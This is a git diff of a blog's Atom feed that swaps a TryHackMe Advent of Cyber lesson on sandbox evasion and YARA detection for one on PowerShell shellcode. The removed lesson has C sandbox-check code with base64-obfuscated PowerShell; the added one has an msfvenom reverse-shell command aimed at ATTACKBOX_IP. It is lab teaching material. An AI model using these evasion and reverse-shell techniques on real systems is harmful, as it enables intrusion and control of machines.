@@ -1,41 +1,52 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-09T11:20:00-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html"></title><link href="http://localhost:4000/2024-12-06-Day6" rel="alternate" type="text/html" title="" /><published>2024-12-09T11:20:00-05:00</published><updated>2024-12-09T11:20:00-05:00</updated><id>http://localhost:4000/2024-12-06-Day6</id><content type="html" xml:base="http://localhost:4000/2024-12-06-Day6"><![CDATA[<p><em>Mayor Malware was scheming, quite full of delight, To ruin SOC-mas and frighten SOC teams. But Glitch and McSkidy had spoiled his plan, By uncovering secrets that exposed the man!</em></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-09T12:48:43-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">Day8</title><link href="http://localhost:4000/Day8" rel="alternate" type="text/html" title="Day8" /><published>2024-12-08T00:00:00-05:00</published><updated>2024-12-08T00:00:00-05:00</updated><id>http://localhost:4000/Day8</id><content type="html" xml:base="http://localhost:4000/Day8"><![CDATA[<p>The Story</p>
 
-<p>Mayor Malware slammed his hand on the table, his eyes narrowing as the report flashed on his screen. Glitch and McSkidy had uncovered his trail. He took a deep breath, calming himself. <em>“No matter,”</em> he muttered, a sinister grin forming. <em>“They may have found me but haven’t stopped me.”</em> His confidence stemmed from the malware he had crafted—so devious and advanced that it would easily evade detection.</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg" alt="Task banner for day 8" /></p>
 
-<p>But before unleashing it to wreak havoc on SOC teams and ruin SOC-mas, there was one final step. He needed to test it <a href="in">in</a> a sandbox.</p>
+<p><em>Glitch the hacker, clever yet distrusted,</em></p>
+
+<p><em>Wrote a script with skills finely adjusted.</em></p>
+
+<p><em>Shellcode magic to his home it would send,</em></p>
+
+<p><em>Where secrets of Wareville he’d carefully penned.</em></p>
+
+<p>\n</p>
+
+<p>Glitch, a skilled but mistrusted hacker, was prepping for a tech conference. He was eager to share his shellcode script that remotely accessed his home system. As he worked, he noticed Mayor Malware’s henchmen lurking nearby.</p>
+
+<p><em>“They’re wasting their time. I don’t have anything they’d want,”</em> Glitch chuckled.</p>
+
+<p>He didn’t realise that hidden in his home system was something they desperately sought—a research paper he wrote on Wareville’s defences, a treasure Mayor Malware was eager to obtain.</p>
 
 <h2 id="learning-objectives">Learning Objectives</h2>
 
 <ul>
-  <li>Analyze malware behaviour using sandbox tools.</li>
-  <li>Explore how to use YARA rules to detect malicious patterns.</li>
-  <li>Learn about various malware evasion techniques.</li>
-  <li>Implement an evasion technique to bypass YARA rule detection.</li>
+  <li>Grasp the fundamentals of writing shellcode</li>
+  <li>Generate shellcode for reverse shells</li>
+  <li>Executing shellcode with PowerShell</li>
 </ul>
 
 <h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
 
 <p>Before moving forward, review the questions in the connection card shown below:</p>
 
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728927615.png" alt="Connection card" /></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731050107820.png" alt="Task connection card." /></p>
 
-<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> Button below to start the virtual machine in split-screen view.</p>
+<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine in split-screen view. If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>
 
-<p>If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM credentials RDP" /></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>
 
 <table>
   <thead>
     <tr>
       <th><strong>Username</strong></th>
-      <th>administrator</th>
+      <th>glitch</th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td><strong>Password</strong></td>
-      <td>TryH@cKMe9#21</td>
+      <td>Passw0rd</td>
     </tr>
     <tr>
       <td><strong>IP</strong></td>
@@ -44,247 +55,266 @@
   </tbody>
 </table>
 
-<p><em>He slipped his malware into a sandbox to see, \n What tricks it could play and what flaws there might be. \n For sandboxes, you see, are used by the wise, Defenders inspect, but attackers revise!</em></p>
+<p>Aside from the VM, you must also start the AttackBox for this task. Click on the <code class="language-plaintext highlighter-rouge">Start AttackBox</code> button located above this page.</p>
 
-<h2 id="detecting-sandboxes">Detecting Sandboxes</h2>
+<h2 id="essential-terminologies">Essential Terminologies</h2>
 
-<p>A sandbox is an isolated environment where (malicious) code is executed without affecting anything outside the system. Often, multiple tools are installed to monitor, record, and analyze the code’s behaviour.</p>
+<p><em>A reverse shell to his system so tight,</em></p>
 
-<p>Mayor Malware knows that before his malware executes, it needs to check if it is running on a Sandbox environment. If it is, then it should not continue with its malicious activity.</p>
+<p><em>He planned to showcase at the tech conference night.</em></p>
 
-<p>To do so, he has settled on one technique, which checks if the directory <code class="language-plaintext highlighter-rouge">C:\Program Files</code> is present by querying the Registry path <code class="language-plaintext highlighter-rouge">HKLM\\Software\\Microsoft\\Windows\\CurrentVersion</code>. The value can be confirmed by visiting the Registry path within the Registry Editor, as shown below:</p>
+<p><em>Eager to share how his shellcode could impress,</em></p>
 
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5e8dd9a4a45e18443162feab-1730152060596.png" alt="Registry editor" /></p>
-
-<p>To open the <code class="language-plaintext highlighter-rouge">Windows Registry Editor</code>, navigate to the <code class="language-plaintext highlighter-rouge">Start Menu</code> on the bottom, select <code class="language-plaintext highlighter-rouge">Run</code>, enter <code class="language-plaintext highlighter-rouge">regedit</code>, and press enter.</p>
-
-<p>This directory is often absent on sandboxes or other virtualized environments, which could indicate that the malware is running in a sandbox.</p>
-
-<p>Here’s what it looks like in the C Programming Language:</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nf">registryCheck</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">registryPath</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">HKLM</span><span class="se">\\</span><span class="s2">Software</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">CurrentVersion</span><span class="dl">"</span><span class="p">;</span>
-    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">valueName</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ProgramFilesDir</span><span class="dl">"</span><span class="p">;</span>
-
-    <span class="c1">// Prepare the command string for reg.exe</span>
-    <span class="nx">char</span> <span class="nx">command</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-    <span class="nf">snprintf</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="nf">sizeof</span><span class="p">(</span><span class="nx">command</span><span class="p">),</span> <span class="dl">"</span><span class="s2">reg query </span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2"> /v %s</span><span class="dl">"</span><span class="p">,</span> <span class="nx">registryPath</span><span class="p">,</span> <span class="nx">valueName</span><span class="p">);</span>
-    <span class="c1">// Run the command</span>
-    <span class="nx">int</span> <span class="nx">result</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="nx">command</span><span class="p">);</span>
-    <span class="c1">// Check for successful execution</span>
-    <span class="k">if </span><span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nf">printf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Registry query executed successfully.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nf">fprintf</span><span class="p">(</span><span class="nx">stderr</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Failed to execute registry query.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="nx">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">flag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[REDACTED]</span><span class="dl">"</span><span class="p">;</span>
-    <span class="nf">registryCheck</span><span class="p">();</span>
-        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>\n Don’t worry—you don’t have to understand every detail of the code. All you need to know is that this function is designed to check the system’s registry for a specified directory path (ProgramFilesDir). This path’s presence or absence helps the malware determine whether it’s running in a typical or virtualized environment,like a sandbox.</p>
-
-<h2 id="can-yara-do-it">Can YARA Do It?</h2>
-
-<p>Mayor Malware knows that McSkidy is a big fan of YARA rules.</p>
-
-<p>YARA is a tool used to identify and classify malware based on patterns in its code. By writing custom rules, analysts can define specific characteristics to look for—such as particular strings, file headers, or behaviours—and YARA will scan files or processes to find matches, making it invaluable for detecting malicious code.</p>
-
-<p>Mayor Malware does not think such a simple tool can detect his malware. But just to be sure, he has to test it out himself.</p>
-
-<p>To do this, he wrote a small script that executes a YARA detection rule every time a new event is added to the System monitor log. This particular YARA rule detects any command that tries to access the registry. \n</p>
-
-<p>Let’s have a look at the rule:</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">rule</span> <span class="nx">SANDBOXDETECTED</span>
-<span class="p">{</span>
-    <span class="nl">meta</span><span class="p">:</span>
-        <span class="nx">description</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Detects the sandbox by querying the registry key for Program Path</span><span class="dl">"</span>
-        <span class="nx">author</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">TryHackMe</span><span class="dl">"</span>
-        <span class="nx">date</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">2024-10-08</span><span class="dl">"</span>
-        <span class="nx">version</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1.1</span><span class="dl">"</span>
-
-    <span class="nx">strings</span><span class="p">:</span>
-
-    <span class="nx">$cmd</span><span class="o">=</span> <span class="dl">"</span><span class="s2">Software</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">CurrentVersion</span><span class="se">\"</span><span class="s2"> /v ProgramFilesDir</span><span class="dl">"</span> <span class="nx">nocase</span>
-
-
-
-    <span class="nx">condition</span><span class="p">:</span>
-        <span class="nx">$cmd</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>Let’s understand the contents:</p>
+<p><em>He aimed to enlighten, to teach and progress.</em></p>
 
 <ul>
-  <li>In the <strong>strings</strong> section, we have defined variables that include the value to look out for: $cmd</li>
-  <li>In the <strong>condition</strong> section, we define when the rule will match the scanned file. In this case, if any of the specified strings are present.</li>
+  <li>\n *</li>
 </ul>
 
-<p>For his testing, Mayor Malware has set up a one-function script that runs the Yara rule and logs a true positive in <code class="language-plaintext highlighter-rouge">C:\Tools\YaraMatches.txt</code>.</p>
-
-<p>Open up a PowerShell window, navigate to the <code class="language-plaintext highlighter-rouge">C:\Tools</code> directory, and use the following command to start up the EDR:</p>
-
-<p>Administrator: Windows PowerShell</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="nx">JingleBells</span><span class="p">.</span><span class="nx">ps1</span>
-<span class="nx">No</span> <span class="nx">events</span> <span class="nx">found</span> <span class="k">in</span> <span class="nx">Sysmon</span> <span class="nx">log</span><span class="p">.</span>
-<span class="nx">Monitoring</span> <span class="nx">Sysmon</span> <span class="nx">events</span><span class="p">...</span> <span class="nx">Press</span> <span class="nx">Ctrl</span><span class="o">+</span><span class="nx">C</span> <span class="nx">to</span> <span class="nx">exit</span><span class="p">.</span>
-
-</code></pre></div></div>
-
-<p>This tool will run on the system and continuously monitor the generated Event Logs. It will alert you if it finds any activity/event that indicates the registry mentioned above key is being queried.</p>
-
-<p>Now run the malware by navigating to <code class="language-plaintext highlighter-rouge">C:\Tools\Malware</code>, and double-clicking on <code class="language-plaintext highlighter-rouge">MerryChristmas.exe</code>.</p>
-
-<p>If our custom script did its job, you should have witnessed a popup by our EDR with a flag included, as shown below. This will be the answer to Question 1 below. You can now exit the custom EDR by pressing <code class="language-plaintext highlighter-rouge">Ctrl+C</code>.</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5e8dd9a4a45e18443162feab-1730154020793.png" alt="PowerShell taskbar item" /></p>
-
-<p><strong><em>Note:</em></strong> <em>If the popup does not show up, hover over the PowerShell item in the taskbar. It should show the popup that was generated.</em></p>
-
-<h2 id="adding-more-evasion-techniques">Adding More Evasion Techniques</h2>
-
-<p>Ah, it seems that Yara can detect the evasion that Mayor Malware has added. No worries. Because we can make our malware even stealthier by introducing obfuscation.</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nf">registryCheck</span><span class="p">()</span> <span class="p">{</span>
-<span class="c1">// Encoded PowerShell command to query the registry</span>
-    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">encodedCommand</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuACIAIAAtAE4AYQBtAGUAIABQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBEAGkAcgA=</span><span class="dl">"</span><span class="p">;</span>
-    <span class="c1">// Prepare the PowerShell execution command</span>
-    <span class="nx">char</span> <span class="nx">command</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-    <span class="nf">snprintf</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="nf">sizeof</span><span class="p">(</span><span class="nx">command</span><span class="p">),</span> <span class="dl">"</span><span class="s2">powershell -EncodedCommand %s</span><span class="dl">"</span><span class="p">,</span> <span class="nx">encodedCommand</span><span class="p">);</span>
-
-    <span class="c1">// Run the command</span>
-    <span class="nx">int</span> <span class="nx">result</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="nx">command</span><span class="p">);</span>
-
-    <span class="c1">// Check for successful execution</span>
-    <span class="k">if </span><span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nf">printf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Registry query executed successfully.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nf">fprintf</span><span class="p">(</span><span class="nx">stderr</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Failed to execute registry query.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p><strong>Code Explanation</strong></p>
-
-<p>The above code does the same thing: query the same registry key to get the information about the Program Data. The only difference is that the query is now encoded using base64, and the code uses the PowerShell to execute the query. The encoded string can be checked by decoding it using a tool like <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, as shown below: \n</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730911341730.png" alt="CyberChef GUI" /></p>
-
-<h2 id="beware-of-floss">Beware of Floss</h2>
-
-<p>While obfuscation is helpful, we also need to know that there are tools available that extract obfuscated strings from malware binaries. One such tool is Floss, a powerful tool developed by Mandiant that functions similarly to the Linux strings tool but is optimized for malware analysis, making it ideal for revealing any concealed details.</p>
-
-<p>To try out Floss, open a PowerShell Window and enter the following command:</p>
-
-<p>Administrator: Windows Powershell \n</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">FLOSS</span><span class="o">&gt;</span> <span class="nx">floss</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">Malware</span><span class="err">\</span><span class="nx">MerryChristmas</span><span class="p">.</span><span class="nx">exe</span> <span class="o">|</span><span class="nx">Out</span><span class="o">-</span><span class="nx">file</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">tools</span><span class="err">\</span><span class="nx">malstrings</span><span class="p">.</span><span class="nx">txt</span>
-
-</code></pre></div></div>
-
-<p>The above command can take up to two minutes to complete. In the meantime, let’s break down the command:</p>
+<p>Before we start, review some important concepts to help you better understand the upcoming content. Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.</p>
 
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">floss.exe C:\Tools\Malware\MerryChristmas.exe</code>: This command scans for strings in the binary MerryChrismas.exe. If any hardcoded variables were defined in the malware, Floss should find them.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">|</code>symbol redirects the output of the command in front of it to the input of the command behind it. \n</li>
-  <li><code class="language-plaintext highlighter-rouge">Out-file C:\tools\malstrings.txt</code>: We save the command results in a file called <code class="language-plaintext highlighter-rouge">malstrings.txt</code>.</li>
+  <li><strong>Shellcode</strong>: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.</li>
+  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375094892.png" alt="anti-virus shield depicting protection" /><strong>PowerShell</strong>: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.</li>
+  <li><strong>Windows Defender</strong>: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defences. We will cover the latter one in this task. \n</li>
+  <li><strong>Windows API</strong>: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">CreateThread</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>, which we will also use in this task for exploitation.</li>
+  <li><strong>Accessing Windows API through PowerShell Reflection</strong>: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.</li>
+  <li><strong>Reverse shell</strong>: A type of connection in which the target (the machine you’re trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox). </li>
+  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375153734.png" alt="process flow of reverse shell" /></li>
 </ul>
 
-<p>Once the command is done, open <code class="language-plaintext highlighter-rouge">malstrings.txt</code>, press <code class="language-plaintext highlighter-rouge">CTRL+F</code>, and search for the string Mayor Malware. Enter the flag as the answer to question two. The format of the string is <code class="language-plaintext highlighter-rouge">THM{}</code>.</p>
+<h2 id="generating-shellcode">Generating Shellcode</h2>
 
-<h2 id="using-yara-rules-on-sysmon-logs">Using YARA Rules on Sysmon Logs</h2>
+<p><em>But Mayor Malware’s minions, sneaky and sly,</em></p>
 
-<p>These YARA rules are becoming a pain to Mayor Malware’s backside.</p>
+<p><em>Found his script and gave it a try.</em></p>
 
-<p>If he wants his malware to be undetectable, he needs to research how YARA rules can be used to stop him. For example, his research tells him that YARA rules can also be used to check Sysmon logs for any artefacts left by malware! He’ll need to test this as well.</p>
+<p><em>They tampered the code, changed port and IP,</em></p>
 
-<p><strong>Sysmon</strong>, a tool from Microsoft’s Sysinternals suite, continuously monitors and logs system activity across reboots. This Windows service provides detailed event data on process creation, network connections, and file changes—valuable insights when tracing malware behaviour.</p>
-
-<p>A YARA rule will look for events with <code class="language-plaintext highlighter-rouge">event id 1: Process created</code> for this to work. There are many entries in the Sysmon log. To make it easier to find the event we are looking for, we will apply a custom filter using the <code class="language-plaintext highlighter-rouge">EventRecordID</code> that we can see in the log <code class="language-plaintext highlighter-rouge">YaraMatches.txt</code> located in <code class="language-plaintext highlighter-rouge">C:\Tools</code>.</p>
-
-<p>Open a PowerShell window and enter the following command to check the contents of the EDR log file:</p>
-
-<p><code class="language-plaintext highlighter-rouge">get-content C:\Tools\YaraMatches.txt</code></p>
-
-<p>You should get a result similar to the output below:</p>
-
-<p>Administrator: Windows PowerShell</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="o">&gt;</span> <span class="kd">get</span><span class="o">-</span><span class="nx">content</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">YaraMatches</span><span class="p">.</span><span class="nx">txt</span>
-
-<span class="nx">Event</span> <span class="nx">Time</span><span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">15</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">39</span>
-<span class="nx">Event</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">1</span>
-<span class="nx">Event</span> <span class="nx">Record</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">96517</span>
-<span class="nx">Command</span> <span class="nx">Line</span><span class="p">:</span> <span class="nx">reg</span>  <span class="nx">query</span> <span class="dl">"</span><span class="s2">HKLM</span><span class="se">\</span><span class="s2">Software</span><span class="se">\</span><span class="s2">Microsoft</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">CurrentVersion</span><span class="dl">"</span> <span class="o">/</span><span class="nx">v</span> <span class="nx">ProgramFilesDir</span>
-<span class="nx">YARA</span> <span class="nx">Result</span><span class="p">:</span> <span class="nx">DetectShutdownTimeQuery</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">AppData</span><span class="err">\</span><span class="nx">Local</span><span class="err">\</span><span class="nx">Temp</span><span class="err">\</span><span class="mi">2</span><span class="err">\</span><span class="nx">tmp8D61</span><span class="p">.</span><span class="nx">tmp</span>
-
-</code></pre></div></div>
-
-<p>Note down the <code class="language-plaintext highlighter-rouge">Event Record ID value</code>. We will use this value to create a custom filter in the <code class="language-plaintext highlighter-rouge">Windows Event Viewer</code>.</p>
-
-<p>Next, open the <code class="language-plaintext highlighter-rouge">Windows Event Viewer</code> by clicking on its logo in the taskbar and, on the left-hand side, navigate to <code class="language-plaintext highlighter-rouge">Applications and Services Logs -&gt; Microsoft -&gt; Windows -&gt; Sysmon -&gt; Operational</code>.</p>
-
-<p>Continue by navigating to <code class="language-plaintext highlighter-rouge">Filter Current Log</code> on the right-hand side of the screen.</p>
-
-<p>You should see a window like the one below:</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1731059911377.png" alt="filter current log windows" /></p>
-
-<p>Navigate to XML and tick the checkbox <code class="language-plaintext highlighter-rouge">Edit query manually</code>. Click <code class="language-plaintext highlighter-rouge">Yes</code> to confirm. Finally, copy the following filter into the input box:</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">QueryList</span><span class="o">&gt;</span>
-  <span class="o">&lt;</span><span class="nx">Query</span> <span class="nx">Id</span><span class="o">=</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span> <span class="nx">Path</span><span class="o">=</span><span class="dl">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="dl">"</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">Select</span> <span class="nx">Path</span><span class="o">=</span><span class="dl">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="dl">"</span><span class="o">&gt;</span>
-      <span class="o">*</span><span class="p">[</span><span class="nx">System</span><span class="p">[(</span><span class="nx">EventRecordID</span><span class="o">=</span><span class="dl">"</span><span class="s2">INSERT_EVENT_record_ID_HERE</span><span class="dl">"</span><span class="p">)]]</span>
-    <span class="o">&lt;</span><span class="sr">/Select</span><span class="err">&gt;
-</span>  <span class="o">&lt;</span><span class="sr">/Query</span><span class="err">&gt;
-</span><span class="o">&lt;</span><span class="sr">/QueryList</span><span class="err">&gt;
-</span></code></pre></div></div>
-
-<p>Replace the <code class="language-plaintext highlighter-rouge">EventRecordID</code> value with the one you recorded before. Apply the filter by clicking <code class="language-plaintext highlighter-rouge">OK</code>. Now you get the event related to the malware. Click on the event and then on the <code class="language-plaintext highlighter-rouge">Details</code> tab. You should get the following output:</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730105846377.png" alt="Screenshot of details tab" /></p>
-
-<p>Let’s take a look at the <code class="language-plaintext highlighter-rouge">EventData</code> that is valuable to us:</p>
+<p><em>Twisted his work with a sinister glee.</em></p>
 
 <ul>
-  <li>The <code class="language-plaintext highlighter-rouge">ParentImage</code> key shows us which parent process spawned the cmd.exe process to execute the registry check. We can see it was our malware located at <code class="language-plaintext highlighter-rouge">C:\Tools\Malware\MerryChristmas.exe</code>.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">ParentProcessId</code> and <code class="language-plaintext highlighter-rouge">ProcessId</code> keys are valuable for follow-up research. We could also use them to check other logs for related events.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">User</code> key can help us determine which privileges were used to run the <code class="language-plaintext highlighter-rouge">cmd.exe</code> command. The malware could have created a hidden account and used that to run commands.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">CommandLine</code> key shows which command was run in detail, helping us identify the malware’s actions.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">UtcTime</code> key is essential for creating a time frame for the malware’s operation. This time frame can help you focus your threat hunting efforts.</li>
+  <li>\n *</li>
 </ul>
 
-<h2 id="never-gonna-give-up">Never Gonna Give Up</h2>
+<p>Let’s learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called <code class="language-plaintext highlighter-rouge">msfvenom</code> to get a reverse shell. \n</p>
 
-<p><em>His malware, it seemed, wasn’t quite ready for town. \n “There are watchers and scanners and rules by the ton! \n If I’m not careful, they’ll catch all my fun!”</em></p>
+<p>In the AttackBox, open the terminal and enter the command <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell</code> that will generate the shellcode. The output will look like the following.  You will require to replace the <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code> with the IP of the AttackBox.</p>
 
